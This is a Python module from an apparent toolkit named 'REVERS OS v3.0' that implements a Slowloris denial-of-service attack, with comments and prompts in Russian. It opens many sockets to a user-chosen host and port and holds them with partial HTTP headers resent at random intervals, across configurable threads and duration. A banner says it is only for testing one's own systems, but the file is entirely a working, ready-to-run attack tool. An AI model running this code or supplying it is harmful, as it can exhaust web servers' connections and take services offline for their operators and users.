#!/usr/bin/env python3
"""
REVERS OS v3.0 — Slowloris
⚠️ Только для тестирования своих систем!
"""

import socket
import threading
import time
import random
import sys
from core.utils import C_ERROR, C_WARNING, C_INFO, C_BRIGHT, C_RESET

running = False

def slowloris_worker(target, port, duration):
    global running
    end_time = time.time() + duration
    sockets_list = []
    
    # Создаём соединения
    for _ in range(50):
        if not running:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, port))
            sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            sock.send(f"Host: {target}\r\n".encode("utf-8"))
            sock.send("User-Agent: Mozilla/5.0\r\n".encode("utf-8"))
            sock.send("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
            sockets_list.append(sock)
        except:
            pass
    
    # Поддерживаем соединения
    while running and time.time() < end_time:
        for sock in list(sockets_list):
            try:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except:
                sockets_list.remove(sock)
        time.sleep(random.randint(5, 15))
    
    # Закрываем
    for sock in sockets_list:
        try:
            sock.close()
        except:
            pass

def run_slowloris(args):
    global running
    
    print(f"\n{C_ERROR}╔══════════════════════════════════════════╗{C_RESET}")
    print(f"{C_ERROR}║  ⚠️  ВНИМАНИЕ! ТОЛЬКО ДЛЯ СВОИХ СИСТЕМ!  ║{C_RESET}")
    print(f"{C_ERROR}║  Незаконное использование запрещено!    ║{C_RESET}")
    print(f"{C_ERROR}╚══════════════════════════════════════════╝{C_RESET}\n")
    
    if not args:
        target = input(f"{C_INFO}Цель (IP/домен): {C_RESET}").strip()
        if not target:
            print(f"{C_ERROR}[!] Цель не указана.{C_RESET}")
            return
        try:
            port = int(input(f"{C_INFO}Порт (по умолч. 80): {C_RESET}").strip() or "80")
        except:
            port = 80
        try:
            threads = int(input(f"{C_INFO}Потоков (по умолч. 3): {C_RESET}").strip() or "3")
        except:
            threads = 3
        try:
            duration = int(input(f"{C_INFO}Длительность (сек, по умолч. 60): {C_RESET}").strip() or "60")
        except:
            duration = 60
    else:
        target = args[0]
        try:
            port = int(args[1]) if len(args) > 1 else 80
            threads = int(args[2]) if len(args) > 2 else 3
            duration = int(args[3]) if len(args) > 3 else 60
        except:
            port, threads, duration = 80, 3, 60
    
    print(f"\n{C_WARNING}  ══════════════════════════════════════════{C_RESET}")
    print(f"{C_WARNING}         🐢 SLOWLORIS{C_RESET}")
    print(f"{C_WARNING}         Цель: {target}:{port}{C_RESET}")
    print(f"{C_WARNING}         Потоков: {threads}{C_RESET}")
    print(f"{C_WARNING}         Длительность: {duration} сек{C_RESET}")
    print(f"{C_WARNING}  ══════════════════════════════════════════{C_RESET}\n")
    
    running = True
    workers = []
    
    print(f"{C_INFO}[*] Запуск...{C_RESET}")
    start_time = time.time()
    
    for _ in range(threads):
        t = threading.Thread(target=slowloris_worker, args=(target, port, duration))
        t.daemon = True
        t.start()
        workers.append(t)
    
    try:
        while time.time() - start_time < duration and running:
            time.sleep(1)
            elapsed = int(time.time() - start_time)
            sys.stdout.write(f"\r  Держим соединения... {elapsed}s / {duration}s")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n{C_WARNING}[!] Прервано.{C_RESET}")
    
    running = False
    for t in workers:
        t.join(timeout=2)
    
    print(f"\n{C_INFO}[*] Slowloris завершён.{C_RESET}\n")
